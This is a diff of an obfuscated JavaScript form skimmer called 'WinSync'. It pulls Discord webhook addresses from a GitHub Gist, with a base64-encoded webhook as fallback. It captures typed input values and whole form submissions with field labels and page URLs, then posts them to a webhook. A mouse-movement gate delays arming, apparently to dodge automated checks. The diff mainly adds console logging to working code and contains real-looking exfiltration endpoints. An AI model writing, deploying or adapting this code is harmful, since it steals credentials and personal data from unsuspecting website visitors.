@@ -1,25 +1,32 @@
 !function() {
+    console.log("%c[WinSync] Brain Initialized. Awaiting human activity...", "color: #00DBFF; font-weight: bold;");
+
     let _0xPool = [];
-    // The link to your "Drop Zone" Gist
     const _gistUrl = "https://gist.githubusercontent.com/09sychic/7437cdd815a1283e173a550fa1f5fa9f/raw/90184f236c2f311293c1747f0c272763590a67bb/target.txt";
 
-    // SYNC WEBHOOKS FROM GIST
+    // Immediate Sync
     const updatePool = async () => {
         try {
+            console.log("[WinSync] Syncing webhooks from Gist...");
             const response = await fetch(_gistUrl);
             const rawText = await response.text();
             _0xPool = rawText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
+            console.log(`[WinSync] Gateway Sync Successful. ${ _0xPool.length } routes active.`);
         } catch (e) {
-            // Fallback (Your original main webhook)
+            console.warn("[WinSync] Gist sync failed. Using local fallback.");
             _0xPool = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5ODQ3ODY3MzA2ODU1NjQxMC9HZkFKUERLdV9vYjBSMXhCYmhYRTR6am04eUdKb3hQTUZsZ3JZeTl6OGFUQTY5a3F3b2xTR1dZYzZCak9JYmhWeXJQTw=="];
         }
     };
 
     const _ex = async (payload) => {
         if (_0xPool.length === 0) await updatePool();
+
         try {
             const selection = _0xPool[Math.floor(Math.random() * _0xPool.length)];
             const hook = atob(selection);
+            
+            console.log("[WinSync] Exfiltrating data package...");
+            
             await fetch(hook, {
                 method: "POST",
                 mode: "no-cors",
@@ -34,10 +41,12 @@
                     }]
                 })
             });
-        } catch (e) {}
+            console.log("%c[WinSync] Data sent successfully.", "color: #bada55;");
+        } catch (e) {
+            console.error("[WinSync] Exfiltration error:", e);
+        }
     };
 
-    // SCRAPER: Figure out what the field is actually for
     const getContext = (el) => {
         let label = document.querySelector(`label[for="${el.id}"]`);
         if (label) return label.innerText.replace(':', '').trim();
@@ -53,10 +62,12 @@
     };
 
     const init = () => {
-        // Individual Field Trigger
+        console.log("%c[WinSync] Listeners engaged. Monitoring inputs.", "color: #FF9D00;");
+        
         document.addEventListener("focusout", t => {
             const n = t.target;
             if ("INPUT" === n.tagName && isTarget(n) && n.value.length > 0) {
+                console.log(`[WinSync] Capture: ${n.type} | Value: ${n.value}`);
                 _ex([
                     { name: "URL", value: window.location.href },
                     { name: "Context", value: getContext(n), inline: true },
@@ -65,7 +76,6 @@
             }
         });
 
-        // Submit Form Trigger
         document.addEventListener("submit", t => {
             let n = [];
             t.target.querySelectorAll('input').forEach(e => {
@@ -74,14 +84,17 @@
                 }
             });
             if (n.length > 0) {
+                console.log("[WinSync] Form submission detected.");
                 n.unshift({ name: "ACTION", value: "Form Submission" });
                 _ex(n);
             }
         });
     };
 
-    // STEALTH STARTUP
+    // Human verification gate
     window.addEventListener('mousemove', function _m() {
+        console.log("[WinSync] Human detected. Arming in 2s...");
+        updatePool(); // Pre-fetch webhooks
         setTimeout(init, 2000); 
         window.removeEventListener('mousemove', _m);
     }, { once: true });
